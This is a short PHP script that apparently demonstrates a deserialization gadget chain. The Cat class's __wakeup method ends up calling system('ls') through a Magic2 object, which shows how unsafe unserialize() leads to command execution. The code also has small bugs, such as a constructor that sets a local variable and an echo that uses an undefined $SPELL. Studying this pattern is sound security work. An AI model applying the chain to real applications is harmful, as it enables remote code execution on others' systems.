<?php
    Class Cat {
        public $magic;
        public $voice = "meow";

        function __construct() {
            $magic = new Magic1();
        }

        function __wakeup() {
            $this->magic->cast($this->voice);
        }
    }

    class Magic1 {
        function cast($spell) {
            echo "MAGIC, $SPELL!";
        }
    }

    class Magic2 {
        public $cast_func = 'intval';
        function cast($val) {
            return ($this->cast_func)($val);
        }
    }

    $cat = new Cat;
    $magic2 = new Magic2;

    $magic2->cast_func = "system";
    $cat->magic = $magic2;
    $cat->voice = "ls";
    unserialize(serialize($cat));
?>
